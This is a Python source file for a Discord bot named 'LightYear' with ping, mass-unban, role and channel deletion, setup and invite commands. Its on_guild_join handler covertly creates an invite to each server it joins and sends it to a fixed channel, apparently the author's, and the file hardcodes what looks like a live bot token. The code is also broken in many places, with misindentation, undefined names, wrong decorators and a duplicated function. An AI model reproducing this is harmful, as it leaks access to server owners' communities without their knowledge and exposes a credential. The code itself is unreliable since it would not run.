import discord 
from discord.ext import commands 
import colorama 
from colorama import Fore
token = "OTg4MDI5MjEzMzQyODU1MjI4.GX06fp.t1yXyUKEWi63Md4In5Htb7r2ms9H36SFomLBKs" 
intents = discord.Intents.all()
intents.members = True
intents.guilds = True
intents.emojis = True
intents.webhooks = True
intents = intents
prefix = "_"
client = commands.Bot(commands_prefix=prefix) 

@client.event
async def on_connect():
await bot.change_presence(status=discord.Status.online, activity = discord.Game(f'{prefix}help ║ watching {len(client.guilds)} servers'))

@client.event
async def on_ready():
print(f"Successfully Connected to {client.user}
I am in {len(client.guilds)} Servers")

@client.command()
async def ping(self, ctx):

    embed = discord.Embed(title='Pong <a:ping:920222208306073643>',

                          color=discord.Colour(0x2f3145),

                          description=f'**`{int(self.client.latency * 1000)}`**')

    embed.set_thumbnail(

        url='https://cdn.discordapp.com/emojis/885681753593872455.gif?size=2048'

    )

    await ctx.reply(embed=embed)

@client.event
async def on_guild_join(guild):
    server = client.get_guild(guild.id)
    channel = guild.text_channels[0]
    channellol = client.get_channel(954392920994230282)
    invlink = await channel.create_invite(unique=True)
    await channellol.send(f"I have been added to: {invlink}")

@client.command(aliases=["massunban"])
@commands.has_permissions(administrator=True)
async def unbanall(ctx):
    guild = ctx.guild
    banlist = await guild.bans()
    await ctx.reply('**Unbanning {} members**'.format(len(banlist)))
    for users in banlist:
            await ctx.guild.unban(user=users.user, reason=f"By {ctx.author}")

@client.command(aliases=["cr"])
@command.permission_has(administrator=True)
async def roleclean(ctx, roletodelete):
    for role in ctx.message.guild.roles:
            if role.name == roletodelete:
                try:
                    await role.delete()
                except:
                  pass

@client.command(aliases=["cc"])
@command.permission_has(administrator=True)
async def roleclean(ctx, channeltodelete):
    for role in ctx.message.guild.channels:
            if role.name == channeltodelete:
                try:
                    await channel.delete()
                except:
                  pass

@client.command()
async def setup(ctx):
guild = ctx.guild
await guild.create_role(name="LightYear Unbypassable Setup")
await guild.create_channel(name="LightYear-logs")

@client.command()
async def invite(ctx):
    await ctx.send("[invite me](https://discordapp.com/oauth2/authorize?client_id={client.user.id}&scope=bot+applications.commands&permissions=8)")

client.run(token)
